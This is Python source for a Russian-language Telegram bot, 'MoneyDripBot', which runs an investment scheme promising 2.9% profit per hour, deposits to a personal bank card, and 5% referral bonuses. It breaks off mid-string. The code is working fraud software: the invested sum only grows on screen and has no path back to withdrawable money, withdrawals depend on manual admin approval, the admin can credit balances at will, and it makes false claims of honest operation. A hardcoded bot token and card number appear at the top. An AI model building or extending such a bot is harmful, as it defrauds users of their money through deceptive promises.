import asyncio
import logging
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
import aiosqlite
import re

# ========== НАСТРОЙКИ ==========
TOKEN = "8587086312:AAE9jbbaPZBzU-niDmOK7uhHhpCYSvf_BoU"
ADMIN_ID = 7603296347
SUPPORT_USERNAME = "WWWMMMZZZwq"
CARD_NUMBER = "2200 7012 3329 6489"
CARD_HOLDER = "Дмитрий А."
REFERRAL_BONUS = 0.05  # 5% от пополнения реферала
# ================================

bot = Bot(token=TOKEN)
dp = Dispatcher()

# === ПАРСИНГ ЧИСЕЛ (100k = 100000) ===
def parse_amount(text: str) -> float:
    text = text.lower().replace(" ", "").replace(",", ".")
    if "k" in text:
        return float(text.replace("k", "")) * 1000
    elif "m" in text:
        return float(text.replace("m", "")) * 1000000
    else:
        return float(text)

# === БАЗА ДАННЫХ ===
async def init_db():
    async with aiosqlite.connect("users.db") as db:
        # Основная таблица пользователей
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                balance REAL DEFAULT 0,
                invest_sum REAL DEFAULT 0,
                last_percent TEXT,
                deposit_request REAL DEFAULT 0,
                withdraw_request REAL DEFAULT 0,
                card_number TEXT DEFAULT '',
                referrer_id INTEGER DEFAULT 0,
                referral_earnings REAL DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Таблица истории операций
        await db.execute("""
            CREATE TABLE IF NOT EXISTS history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                type TEXT,
                amount REAL,
                status TEXT,
                details TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Таблица статистики
        await db.execute("""
            CREATE TABLE IF NOT EXISTS stats (
                date TEXT PRIMARY KEY,
                new_users INTEGER DEFAULT 0,
                deposits REAL DEFAULT 0,
                withdraws REAL DEFAULT 0,
                invests REAL DEFAULT 0
            )
        """)
        
        await db.commit()

# === ДОБАВЛЕНИЕ В ИСТОРИЮ ===
async def add_history(user_id: int, type: str, amount: float, status: str = "completed", details: str = ""):
    async with aiosqlite.connect("users.db") as db:
        await db.execute(
            "INSERT INTO history (user_id, type, amount, status, details) VALUES (?, ?, ?, ?, ?)",
            (user_id, type, amount, status, details)
        )
        await db.commit()

# === СТАРТ (С РЕФЕРАЛЬНОЙ ССЫЛКОЙ) ===
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    async with aiosqlite.connect("users.db") as db:
        # Проверяем, новый ли пользователь
        async with db.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,)) as cursor:
            user = await cursor.fetchone()
        
        is_new = user is None
        
        # Регистрируем пользователя
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id) VALUES (?)",
            (user_id,)
        )
        
        # Обрабатываем реферальную ссылку
        if len(args) > 1 and args[1].startswith("ref"):
            referrer_id = int(args[1].replace("ref", ""))
            if referrer_id != user_id and is_new:
                await db.execute(
                    "UPDATE users SET referrer_id = ? WHERE user_id = ?",
                    (referrer_id, user_id)
                )
                
                # Добавляем в историю
                await add_history(user_id, "Регистрация", 0, "completed", f"Реферер: {referrer_id}")
        
        await db.commit()
    
    # Генерируем реферальную ссылку
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Умножить деньги", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 Проценты", callback_data="percent_info")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
         InlineKeyboardButton(text="📊 История", callback_data="history")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    
    welcome_text = (
        "🚀 *Добро пожаловать в MoneyDripBot!*\n\n"
        "💰 Здесь твои деньги работают 24/7\n"
        "📈 Каждый час +2,9% к сумме в работе\n"
        "💳 Пополнение и вывод на карту\n\n"
        "🎁 *Твоя реферальная ссылка:*\n"
        f"`{ref_link}`\n\n"
        "🔥 Приводи друзей и получай 5% с их пополнений!\n\n"
        "👇 Выбери действие:"
    )
    
    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=keyboard)

# === БАЛАНС ===
@dp.callback_query(lambda c: c.data == "balance")
async def show_balance(call: CallbackQuery):
    user_id = call.from_user.id
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT balance, invest_sum, referral_earnings FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            balance = row[0] if row else 0
            invest = row[1] if row else 0
            ref_earnings = row[2] if row else 0
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"💳 *ТВОЙ БАЛАНС*\n\n"
        f"💰 Доступно: `{balance:,.0f}₽`\n"
        f"📈 В работе: `{invest:,.0f}₽`\n"
        f"🎁 Реферальный бонус: `{ref_earnings:,.0f}₽`\n\n"
        f"⏳ Каждый час +2,9% к сумме в работе 🔥",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === РЕФЕРАЛЫ ===
@dp.callback_query(lambda c: c.data == "referrals")
async def show_referrals(call: CallbackQuery):
    user_id = call.from_user.id
    
    async with aiosqlite.connect("users.db") as db:
        # Считаем количество рефералов
        async with db.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,)) as cursor:
            ref_count = await cursor.fetchone()
            ref_count = ref_count[0]
        
        # Сумма заработка с рефералов
        async with db.execute("SELECT referral_earnings FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            ref_earnings = row[0] if row else 0
    
    # Реферальная ссылка
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Копировать ссылку", callback_data=f"copy_ref")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"👥 *РЕФЕРАЛЬНАЯ СИСТЕМА*\n\n"
        f"🎁 *Твоя ссылка:*\n"
        f"`{ref_link}`\n\n"
        f"📊 *Статистика:*\n"
        f"• Приглашено: `{ref_count}` чел.\n"
        f"• Заработано: `{ref_earnings:,.0f}₽`\n\n"
        f"💰 *Бонус:* 5% с каждого пополнения реферала\n"
        f"✅ Бонус начисляется сразу после пополнения\n\n"
        f"👉 Отправь ссылку друзьям и зарабатывай!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ИСТОРИЯ ===
@dp.callback_query(lambda c: c.data == "history")
async def show_history(call: CallbackQuery):
    user_id = call.from_user.id
    
    async with aiosqlite.connect("users.db") as db:
        async with db.execute(
            "SELECT type, amount, status, created_at FROM history WHERE user_id = ? ORDER BY created_at DESC LIMIT 10",
            (user_id,)
        ) as cursor:
            history = await cursor.fetchall()
    
    if not history:
        text = "📊 *ИСТОРИЯ ОПЕРАЦИЙ*\n\nУ тебя пока нет операций."
    else:
        text = "📊 *ИСТОРИЯ ОПЕРАЦИЙ (последние 10)*\n\n"
        for op in history:
            type_map = {
                "deposit": "📥 Пополнение",
                "withdraw": "📤 Вывод",
                "invest": "💰 Умножение",
                "percent": "📈 Проценты",
                "referral": "🎁 Реферальный бонус"
            }
            op_type = type_map.get(op[0], op[0])
            amount = f"{op[1]:,.0f}₽"
            date = datetime.fromisoformat(op[3]).strftime("%d.%m.%Y %H:%M")
            text += f"{op_type}: `{amount}`\n📅 {date}\n\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(text, parse_mode="Markdown", reply_markup=keyboard)

# === ПОПОЛНЕНИЕ ===
@dp.callback_query(lambda c: c.data == "deposit")
async def deposit_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="i_paid")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📥 *ПОПОЛНЕНИЕ БАЛАНСА*\n\n"
        f"💳 *Карта для перевода:*\n"
        f"`{CARD_NUMBER}`\n"
        f"👤 *Получатель:* {CARD_HOLDER}\n\n"
        "💰 *Минимальная сумма:* 100₽\n"
        "🚀 *Максимум:* безлимит\n\n"
        "📌 *Как пополнить:*\n"
        "1️⃣ Переведи любую сумму на карту\n"
        "2️⃣ Нажми кнопку *«✅ Я оплатил»*\n"
        "3️⃣ Введи сумму перевода\n\n"
        "✅ Примеры: `500`, `1.5k`, `2K`\n"
        "👉 `1k = 1000₽`",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === Я ОПЛАТИЛ ===
@dp.callback_query(lambda c: c.data == "i_paid")
async def i_paid(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Отмена", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📝 *Введите сумму перевода:*\n\n"
        "➡️ Например: `500`, `1.5k`, `2K`\n\n"
        "⚠️ Сумма должна совпадать с переводом!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ОБРАБОТКА ПОПОЛНЕНИЯ ===
@dp.message(lambda m: m.text and re.match(r'^[\d\.]+[km]?$', m.text.lower().replace(" ", "")))
async def process_deposit(message: Message):
    user_id = message.from_user.id
    
    try:
        amount = parse_amount(message.text)
    except:
        await message.answer("❌ Неверный формат. Примеры: 500, 1.5k, 2K")
        return
    
    if amount < 100:
        await message.answer("❌ Минимальная сумма пополнения — 100 ₽")
        return
    
    async with aiosqlite.connect("users.db") as db:
        await db.execute("UPDATE users SET deposit_request = ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
        await add_history(user_id, "deposit", amount, "pending", f"Заявка на пополнение")
    
    # Получаем информацию о реферере
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            referrer_id = row[0] if row else 0
    
    # Отправляем админу
    await bot.send_message(
        ADMIN_ID,
        f"🔔 *НОВАЯ ЗАЯВКА НА ПОПОЛНЕНИЕ*\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{CARD_NUMBER}`\n"
        f"👥 Реферер: `{referrer_id if referrer_id else 'нет'}`\n\n"
        f"✅ *Подтвердить:* `/confirm {user_id}`",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"✅ *Заявка отправлена!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"⏳ Ожидай подтверждения (1-3 минуты)\n\n"
        f"❓ Вопросы: @{SUPPORT_USERNAME}",
        parse_mode="Markdown"
    )

# === ПОДТВЕРЖДЕНИЕ ПОПОЛНЕНИЯ (С БОНУСОМ РЕФЕРЕРУ) ===
@dp.message(Command("confirm"))
async def confirm_deposit(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /confirm 123456789")
        return
    
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT deposit_request, referrer_id FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            if not row or row[0] == 0:
                await message.answer("❌ Нет активных заявок")
                return
            
            amount = row[0]
            referrer_id = row[1]
            
            # Начисляем баланс пользователю
            await db.execute("UPDATE users SET balance = balance + ?, deposit_request = 0 WHERE user_id = ?", (amount, user_id))
            
            # Начисляем бонус рефереру (5%)
            if referrer_id and referrer_id != 0:
                bonus = amount * REFERRAL_BONUS
                await db.execute("UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?", 
                               (bonus, bonus, referrer_id))
                await add_history(referrer_id, "referral", bonus, "completed", f"Бонус за пополнение реферала {user_id}")
                
                # Уведомляем реферера
                try:
                    await bot.send_message(
                        referrer_id,
                        f"🎁 *Реферальный бонус!*\n\n"
                        f"Ваш реферал пополнил баланс на `{amount:,.0f}₽`\n"
                        f"💰 Вам начислено `{bonus:,.0f}₽` (5%)\n\n"
                        f"✅ Спасибо, что с нами!",
                        parse_mode="Markdown"
                    )
                except:
                    pass
            
            await db.commit()
            await add_history(user_id, "deposit", amount, "completed", f"Пополнение подтверждено")
    
    await message.answer(f"✅ Баланс пользователя {user_id} пополнен на {amount:,.0f}₽")
    await bot.send_message(
        user_id,
        f"✅ *Баланс пополнен!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"🚀 Можешь запускать умножение!",
        parse_mode="Markdown"
    )

# === УМНОЖИТЬ ДЕНЬГИ ===
@dp.callback_query(lambda c: c.data == "multiply")
async def multiply_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "💰 *УМНОЖЕНИЕ ДЕНЕГ*\n\n"
        "💸 Введи сумму для запуска в работу:\n"
        "• Минимум: 100₽\n"
        "• Каждый час +2,9%\n\n"
        "✅ Примеры: `500`, `1.5k`, `2K`\n\n"
        "⚠️ *Деньги спишутся с баланса мгновенно!*",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ОБРАБОТКА УМНОЖЕНИЯ ===
@dp.message(lambda m: m.text and m.text.lower().startswith('*'))
async def process_multiply(message: Message):
    user_id = message.from_user.id
    text = message.text.replace('*', '').strip()
    
    try:
        amount = parse_amount(text)
    except:
        await message.answer("❌ Неверный формат. Используй: *500, *1.5k, *2K")
        return
    
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            balance = row[0] if row else 0
        
        if amount > balance:
            await message.answer(f"❌ Недостаточно средств. Баланс: `{balance:,.0f}₽`")
            return
        
        if amount < 100:
            await message.answer("❌ Минимальная сумма — 100 ₽")
            return
        
        await db.execute(
            "UPDATE users SET balance = balance - ?, invest_sum = invest_sum + ?, last_percent = ? WHERE user_id = ?",
            (amount, amount, datetime.now().isoformat(), user_id)
        )
        await db.commit()
        await add_history(user_id, "invest", amount, "completed", f"Запуск в работу")
    
    await message.answer(
        f"✅ *ГОТОВО!*\n\n"
        f"💸 `{amount:,.0f}₽` запущены в работу\n"
        f"📈 Каждый час +2,9%\n"
        f"💰 Баланс: `{balance - amount:,.0f}₽`\n"
        f"📊 В работе: `{amount:,.0f}₽`\n\n"
        f"⏳ Первые проценты через 60 минут",
        parse_mode="Markdown"
    )

# === ПРОЦЕНТЫ (КАЖДЫЙ ЧАС) ===
async def percent_worker():
    while True:
        await asyncio.sleep(3600)
        async with aiosqlite.connect("users.db") as db:
            async with db.execute("SELECT user_id, invest_sum FROM users WHERE invest_sum > 0") as cursor:
                users = await cursor.fetchall()
                for user_id, invest in users:
                    profit = invest * 0.029
                    await db.execute("UPDATE users SET invest_sum = invest_sum + ? WHERE user_id = ?", (profit, user_id))
                    await add_history(user_id, "percent", profit, "completed", f"Начисление процентов")
                    try:
                        await bot.send_message(
                            user_id,
                            f"📈 *НАЧИСЛЕНИЕ ПРОЦЕНТОВ*\n\n"
                            f"➕ +`{profit:,.2f}₽`\n"
                            f"💰 В работе: `{invest + profit:,.2f}₽`\n\n"
                            f"⏳ Следующее начисление через 60 минут",
                            parse_mode="Markdown"
                        )
                    except:
                        pass
            await db.commit()

# === ВЫВОД СРЕДСТВ ===
@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📤 *ВЫВОД СРЕДСТВ*\n\n"
        "💰 Минимальная сумма: 100₽\n"
        "💳 Вывод на карту\n\n"
        "➡️ *Введи сумму и номер карты:*\n"
        "Формат: `СУММА НОМЕР_КАРТЫ`\n\n"
        "✅ Пример: `1000 2200123456789012`",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ОБРАБОТКА ВЫВОДА ===
@dp.message(lambda m: len(m.text.split()) == 2 and m.text.split()[0].replace('.', '').isdigit())
async def process_withdraw(message: Message):
    user_id = message.from_user.id
    parts = message.text.split()
    
    try:
        amount = float(parts[0])
        card_number = parts[1]
    except:
        await message.answer("❌ Неверный формат. Используй: `1000 2200123456789012`")
        return
    
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            balance = row[0] if row else 0
        
        if amount > balance:
            await message.answer(f"❌ Недостаточно средств. Баланс: `{balance:,.0f}₽`")
            return
        
        if amount < 100:
            await message.answer("❌ Минимальная сумма вывода — 100 ₽")
            return
        
        await db.execute(
            "UPDATE users SET withdraw_request = ?, card_number = ? WHERE user_id = ?",
            (amount, card_number, user_id)
        )
        await db.commit()
        await add_history(user_id, "withdraw", amount, "pending", f"Заявка на вывод, карта: {card_number[-4:]}")
    
    await bot.send_message(
        ADMIN_ID,
        f"🔔 *НОВАЯ ЗАЯВКА НА ВЫВОД*\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{card_number}`\n\n"
        f"✅ *Подтвердить:* `/withdraw {user_id}`",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"✅ *Заявка на вывод отправлена!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{card_number}`\n"
        f"⏳ Ожидай подтверждения (1-3 минуты)",
        parse_mode="Markdown"
    )

# === ПОДТВЕРЖДЕНИЕ ВЫВОДА ===
@dp.message(Command("withdraw"))
async def confirm_withdraw(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /withdraw 123456789")
        return
    
    async with aiosqlite.connect("users.db") as db:
        async with db.execute("SELECT withdraw_request, card_number FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            if not row or row[0] == 0:
                await message.answer("❌ Нет активных заявок на вывод")
                return
            
            amount = row[0]
            card = row[1]
            
            await db.execute(
                "UPDATE users SET balance = balance - ?, withdraw_request = 0 WHERE user_id = ?",
                (amount, user_id)
            )
            await db.commit()
            await add_history(user_id, "withdraw", amount, "completed", f"Вывод подтвержден, карта: {card[-4:]}")
    
    await message.answer(f"✅ Вывод {amount:,.0f}₽ пользователю {user_id} подтверждён")
    await bot.send_message(
        user_id,
        f"✅ *Вывод подтверждён!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{card}`\n\n"
        f"⏳ Деньги поступят в течение 1-3 минут",
        parse_mode="Markdown"
    )

# === СТАТИСТИКА (АДМИН) ===
@dp.message(Command("stats"))
async def stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect("users.db") as db:
        # Общая статистика
        async with db.execute("SELECT COUNT(*) FROM users") as cursor:
            total_users = (await cursor.fetchone())[0]
        
        async with db.execute("SELECT COUNT(*) FROM users WHERE DATE(created_at) = DATE('now')") as cursor:
            new_users_today = (await cursor.fetchone())[0]
        
        async with db.execute("SELECT SUM(balance) FROM users") as cursor:
            total_balance = (await cursor.fetchone())[0] or 0
        
        async with db.execute("SELECT SUM(invest_sum) FROM users") as cursor:
            total_invest = (await cursor.fetchone())[0] or 0
        
        async with db.execute("SELECT SUM(amount) FROM history WHERE type = 'deposit' AND status = 'completed' AND DATE(created_at) = DATE('now')") as cursor:
            deposits_today = (await cursor.fetchone())[0] or 0
        
        async with db.execute("SELECT SUM(amount) FROM history WHERE type = 'withdraw' AND status = 'completed' AND DATE(created_at) = DATE('now')") as cursor:
            withdraws_today = (await cursor.fetchone())[0] or 0
        
        async with db.execute("SELECT COUNT(*) FROM history WHERE status = 'pending'") as cursor:
            pending_requests = (await cursor.fetchone())[0]
    
    text = (
        f"📊 *СТАТИСТИКА БОТА*\n\n"
        f"👥 *Пользователи:*\n"
        f"• Всего: `{total_users}`\n"
        f"• Новых сегодня: `{new_users_today}`\n\n"
        f"💰 *Финансы:*\n"
        f"• Общий баланс: `{total_balance:,.0f}₽`\n"
        f"• В работе: `{total_invest:,.0f}₽`\n"
        f"• Пополнений сегодня: `{deposits_today:,.0f}₽`\n"
        f"• Выводов сегодня: `{withdraws_today:,.0f}₽`\n\n"
        f"⏳ *Заявки:*\n"
        f"• В обработке: `{pending_requests}`\n\n"
        f"📈 *Проценты:* 2,9% в час\n"
        f"🎁 *Реферальный бонус:* 5%\n"
        f"💳 *Карта:* `{CARD_NUMBER[-4:]}`"
    )
    
    await message.answer(text, parse_mode="Markdown")

# === ДОБАВИТЬ БАЛАНС (АДМИН) ===
@dp.message(Command("add"))
async def add_balance(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = float(parts[2])
    except:
        await message.answer("Используй: /add 123456789 1000")
        return
    
    async with aiosqlite.connect("users.db") as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
        await add_history(user_id, "admin", amount, "completed", f"Начислено администратором")
    
    await message.answer(f"✅ Баланс пользователя {user_id} увеличен на {amount:,.0f}₽")
    await bot.send_message(
        user_id,
        f"💰 *Вам начислено {amount:,.0f}₽!*",
        parse_mode="Markdown"
    )

# === ПОДДЕРЖКА ===
@dp.callback_query(lambda c: c.data == "support")
async def support(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME}")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "🛡 *ПОДДЕРЖКА*\n\n"
        f"📩 Логин: @{SUPPORT_USERNAME}\n"
        f"⏱ Время ответа: 5–15 минут\n\n"
        f"💬 Пиши по любым вопросам!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === КОПИРОВАТЬ РЕФЕРАЛЬНУЮ ССЫЛКУ ===
@dp.callback_query(lambda c: c.data == "copy_ref")
async def copy_ref(call: CallbackQuery):
    await call.answer("Ссылка скопирована! 📋", show_alert=False)
    await call.message.delete()
    await cmd_start(call.message)

# === ИНФО ===
@dp.callback_query(lambda c: c.data == "info")
async def info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "ℹ️ *ИНФОРМАЦИЯ*\n\n"
        "💰 *Проценты:* 2,9% в час\n"
        "📉 *Мин. старт:* 100₽\n"
        "📤 *Мин. вывод:* 100₽\n"
        "🎁 *Реферальный бонус:* 5%\n"
        "💳 *Карта:* Сбербанк\n\n"
        "📌 *Форматы ввода:*\n"
        "• `500` — 500₽\n"
        "• `1.5k` — 1500₽\n"
        "• `2K` — 2000₽\n"
        "• `*500` — умножение\n\n"
        "✅ Работаем честно с 2024 года",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ПРОЦЕНТЫ ИНФО ===
@dp.callback_query(lambda c: c.data == "percent_info")
async def percent_info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📈 *КАК РАБОТАЮТ ПРОЦЕНТЫ*\n\n"
        "1️⃣ Пополни баланс через карту\n"
        "2️⃣ Запусти деньги в работу (*1000)\n"
        "3️⃣ Каждый час +2,9%\n\n"
        "✨ *Пример:*